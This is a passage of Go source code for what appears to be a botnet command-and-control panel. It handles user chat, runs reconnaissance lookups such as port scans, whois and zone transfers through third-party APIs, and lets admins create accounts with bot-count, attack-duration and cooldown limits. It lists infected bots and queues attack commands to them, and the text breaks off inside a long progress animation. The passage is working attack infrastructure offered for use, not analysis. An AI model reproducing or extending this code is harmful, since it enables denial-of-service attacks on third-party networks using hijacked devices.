			fmt.Fprintln(this.conn, "                                \033[1;49;35m║\033[1;49;32mYour Password Has Changed!\033[0m\r")
			password = newPassword
			continue
            
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
		case "chat":

			fmt.Fprintf(this.conn, "\033[1;49;32m║\033[00;1;95mType 'exit' To Leave The Chat!\033[0m\r\n")

			sessionMutex.Lock()
			for _, s := range sessions {
				if s.Chat == true {
					fmt.Fprintf(s.Conn, "\r\n\033[1;49;32m║\033[0m%s\033[00;92m Has Joined The Chat!\033[0m\r\n", username)
				}
			}
			sessionMutex.Unlock()
			session.Chat = true

			for {
				fmt.Fprint(this.conn, "\033[1;49;32m═\033[00;1;95m⮞ ")
				msg, err := this.ReadLine(false)
				if err != nil {
					return
				}

				if msg == "exit" {
					sessionMutex.Lock()
					for _, s := range sessions {
						if s.Chat == true {
							fmt.Fprintf(s.Conn, "\r\n\033[1;49;32m║\033[0m%s\033[31m Has Left The Chat!\033[0m\r\n", username)
						}
					}
					session.Chat = false
					sessionMutex.Unlock()
					break
				}

				sessionMutex.Lock()
				for _, s := range sessions {
					if s.Chat == true && s.Username != username {
						fmt.Fprintf(s.Conn, "\r\033[0m%s\033[1;49;32m⮞ %s\r\n", username, msg)
						fmt.Fprintf(s.Conn, "\033[1;49;32m═\033[00;1;95m⮞ ")
					}
				}
				sessionMutex.Unlock()

			}
			continue
            }
		/*--------------------------------------------------------------------------------------------------------------------------------------------*/
			if err != nil || cmd == "IPLOOKUP" || cmd == "/iplookup" {
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResults\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

        if err != nil || cmd == "PORTSCAN" || cmd == "/portscan" {                  
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35mError... IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResults\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

            if err != nil || cmd == "WHOIS" || cmd == "/whois" {
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/whois/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResults\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

            if err != nil || cmd == "PING" || cmd == "/ping" {
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/nping/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResponse\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

        if err != nil || cmd == "/traceroute" || cmd == "TRACEROUTE" {                  
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35mError... IP Address/Host Name Only!033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResults\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

        if err != nil || cmd == "/resolve" || cmd == "RESOLVE" {                  
            this.conn.Write([]byte("\033[1;49;35mURL (Without www.)\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m                                 ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91mError.. IP Address/Host Name Only!\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResult\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

            if err != nil || cmd == "/reversedns" || cmd == "REVERSEDNS" {
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResult\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

            if err != nil || cmd == "/asnlookup" || cmd == "asnlookup" {
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResult\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

            if err != nil || cmd == "/subnetcalc" || cmd == "SUBNETCALC" {
            this.conn.Write([]byte("\033[1;49;35mIPv4\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResult\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

            if err != nil || cmd == "/zonetransfer" || cmd == "ZONETRANSFER" {
            this.conn.Write([]byte("\033[1;49;35mIPv4 Or Website (Without www.)\033[1;49;35m: \033[1;49;35m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                ║An Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\033[1;49;35mResult\033[1;49;35m: \r\n\033[1;49;35m" + locformatted + "\033[1;49;35m\r\n"))
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDREG" {
            this.conn.Write([]byte("\033[1;49;35m                               ║Username:\033[1;49;35m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;49;35m                               ║Password:\033[1;49;35m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;49;35m                               ║Botcount (-1 for All):\033[1;49;35m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", "Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\033[1;49;35m                               ║Attack Duration (-1 for Unlimited):\033[1;49;35m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\033[2;49;91m                              ║Cooldown (0 for No Cooldown):\033[1;49;35m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", "                               ║Failed to parse Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[1;49;35m- New User Info - \r\n- Username - \033[1;49;35m" + new_un + "\r\n\033[0m- Password - \033[1;49;35m" + new_pw + "\r\n\033[0m- Bots - \033[1;49;35m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;49;35m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;49;35m" + cooldown_str + "   \r\n\033[1;49;35mContinue? (y/n):\033[1;49;35m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\033[1;49;35m                               ║User Added Successfully!\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "REMOVEUSER" {
            this.conn.Write([]byte("\033[1;49;35m                               ║Username: \033[1;49;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[1;49;35m                               ║Are You Sure You Want To Remove \033[1;49;35m" + rm_un + "\033[1;49;35m?(y/n): \033[1;49;35m"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                Unable to Remove User\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;49;35m                                User Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "ADDADMIN" {
            this.conn.Write([]byte("\033[1;49;35m                               ║Username:\033[1;49;35m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;49;35m                               ║Password:\033[1;49;35m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[1;49;35m                               ║Botcount (-1 for All):\033[1;49;35m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", "                               ║Failed to parse the Bot Count")))
                continue
            }
            this.conn.Write([]byte("\033[1;49;35m                               ║Attack Duration (-1 for Unlimited):\033[1;49;35m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m%s\033[0m\r\n", "                               ║Failed to parse the Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\033[2;49;91m                               ║Cooldown (0 for No Cooldown):\033[1;49;35m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", "                               ║Failed to parse the Cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[1;49;35m- New User Info - \r\n- Username - \033[1;49;35m" + new_un + "\r\n\033[0m- Password - \033[1;49;35m" + new_pw + "\r\n\033[0m- Bots - \033[1;49;35m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;49;35m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;49;35m" + cooldown_str + "   \r\n\033[1;49;35mContinue? (y/n):\033[1;49;35m "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m%s\033[0m\r\n", "                               ║Failed to Create New User. Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\033[1;49;35m                               ║Admin Added Successfully!\033[0m\r\n"))
            }
            continue
        }
    
        if cmd == "BOTS" || cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("                                \033[1;49;35m%s \033[1;49;35m[\033[1;49;35m%d\033[1;49;35m]\r\n\033[0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                                Total \033[1;49;35m[\033[1;49;35m%d\033[1;49;35m]\r\n\033[0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                               ║Failed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[1;49;35m                               ║Bot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[2;49;91m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)                                                                
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------->                                                                               \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---------------------------------->                                                       \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------>                                                     \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING--------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING----------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING-------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[32m PREPAREING---------------------------------------------------------->                               \r\n"))
            this.conn.Write([]byte("\033[32m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------->                                                                \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------->                                                             \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[34m PREPAREING------------------------------------------------------------>                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------->                                                                \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------->                                                             \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------->                                                         \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------>                                                       \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING-------------------------------------->                                                     \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------------------------------------------->                                              \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------------------------->                                            \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING--------------------------------------------------->                                        \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING----------------------------------------------------->                                      \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------------->                                    \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING---------------------------------------------------------->                                 \r\n"))
            this.conn.Write([]byte("\033[37m PREPAREING------------------------------------------------------------>                               \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING--------------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------->                                                                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------->                                                                 \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------->                                                              \r\n"))
            this.conn.Write([]byte("\033[341 PREPAREING-------------------------------------->                                                           \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------->                                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------v-------------------------->                                                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------------->                                             \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------- ------------------------------>                                            \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------->                                          \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING-------------------------------------------------------------->                                   \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------------------->                                \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------->                              \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING--------------------------------------------------------------------------->                      \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING----------------------------------------------------------------------------->                    \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------------------->                  \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING---------------------------------------------------------------------------------->               \r\n"))
            this.conn.Write([]byte("\033[1;49;35m PREPAREING------------------------------------------------------------------------------------>             \r\n"))
            this.conn.Write([]byte("\033[34m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(600 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----->                                                                                      \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------->                                                                                    \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING--------->                                                                                  \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------>                                                                               \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING-------------->                                                                             \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING---------------->                                                                           \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING------------------->                                                                        \r\n"))
            this.conn.Write([]byte("\033[36m PREPAREING----------------------->                                                                    \r\n"))
